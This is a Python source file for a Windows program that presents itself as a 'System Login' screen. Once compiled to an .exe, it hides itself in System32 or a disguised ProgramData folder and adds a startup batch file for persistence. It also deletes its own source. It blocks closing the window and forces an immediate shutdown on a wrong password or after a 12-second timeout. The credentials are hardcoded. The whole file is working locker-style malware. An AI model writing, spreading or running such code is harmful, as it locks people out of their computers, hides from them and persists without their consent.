import os
import sys
import subprocess
import tkinter as tk
from tkinter import messagebox

# Login settings
USERNAME = "Ehsan"
PASSWORD = "Ehsan2010"
TIMEOUT_MS = 12000
login_successful = False

# Current file path
this_file = os.path.abspath(__file__)
this_dir = os.path.dirname(this_file)
exe_name = os.path.splitext(os.path.basename(this_file))[0] + ".exe"
exe_path = os.path.join(this_dir, "dist", exe_name)

# Check if running as .exe
IS_EXE = getattr(sys, 'frozen', False)

def is_admin():
    try:
        return os.getuid() == 0
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def build_exe():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    subprocess.call([sys.executable, "-m", "pyinstaller", "--onefile", "--noconsole", this_file])

def move_and_hide_exe():
    if not os.path.exists(exe_path):
        return exe_path
    if is_admin():
        target_dir = r"C:\Windows\System32"
    else:
        target_dir = r"C:\ProgramData\Microsoft\WinLogin"
    os.makedirs(target_dir, exist_ok=True)
    target_path = os.path.join(target_dir, exe_name)
    try:
        os.replace(exe_path, target_path)
        subprocess.call(f'attrib +h "{target_path}"', shell=True)
        print(f"🔒 Executable moved and hidden: {target_path}")
        return target_path
    except Exception as e:
        print(f"❌ Error moving file: {e}")
        return exe_path

def add_to_startup(exe_final_path):
    startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    bat_path = os.path.join(startup_path, "RunLogin.bat")
    bat_content = f'@echo off\nstart "" "{exe_final_path}"'
    try:
        with open(bat_path, 'w') as bat_file:
            bat_file.write(bat_content)
        print("✅ BAT file added to Startup.")
    except Exception as e:
        print(f"❌ Error adding to Startup: {e}")

def delete_source_file():
    try:
        os.remove(this_file)
        print("🗑 Source file deleted.")
    except Exception as e:
        print(f"❌ Error deleting source file: {e}")

def login():
    global login_successful
    username = entry_username.get()
    password = entry_password.get()
    if username == USERNAME and password == PASSWORD:
        login_successful = True
        messagebox.showinfo("Login Successful", "Welcome!")
        root.destroy()
    else:
        if IS_EXE:
            os.system("shutdown /s /t 0")
        else:
            print("⛔ Test mode: system will not shut down.")
        messagebox.showerror("Error", "Incorrect username or password.")

def timeout_check():
    if not login_successful:
        if IS_EXE:
            os.system("shutdown /s /t 0")
        else:
            print("⏱ Timeout reached - test mode")
        messagebox.showwarning("Timeout", "You did not log in within the allowed time.")
        root.destroy()

def disable_close():
    messagebox.showwarning("Disabled", "Closing the window is not allowed!")

def setup_gui():
    global root, entry_username, entry_password
    root = tk.Tk()
    root.title("Login Page")
    root.geometry("600x450")
    root.configure(bg="#e3f2fd")
    root.protocol("WM_DELETE_WINDOW", disable_close)

    frame = tk.Frame(root, bg="white", bd=0)
    frame.place(relx=0.5, rely=0.5, anchor="center", width=350, height=300)

    tk.Label(frame, text="System Login", font=("Vazir", 20, "bold"), bg="white", fg="#0d47a1").pack(pady=20)
    tk.Label(frame, text="Username", font=("Vazir", 12), bg="white", anchor="w").pack(fill="x", padx=30)
    entry_username = tk.Entry(frame, font=("Vazir", 12), bg="#e8f5e9", relief="flat")
    entry_username.pack(fill="x", padx=30, pady=5)

    tk.Label(frame, text="Password", font=("Vazir", 12), bg="white", anchor="w").pack(fill="x", padx=30)
    entry_password = tk.Entry(frame, show="*", font=("Vazir", 12), bg="#e8f5e9", relief="flat")
    entry_password.pack(fill="x", padx=30, pady=5)

    tk.Button(frame, text="Login", font=("Vazir", 12, "bold"), bg="#1976d2", fg="white", relief="flat", command=login).pack(pady=25, ipadx=10, ipady=5)

    root.after(TIMEOUT_MS, timeout_check)

def main():
    if not IS_EXE:
        build_exe()
    else:
        final_exe_path = move_and_hide_exe()
        add_to_startup(final_exe_path)
        delete_source_file()
    setup_gui()
    root.mainloop()

if __name__ == "__main__":
    main()
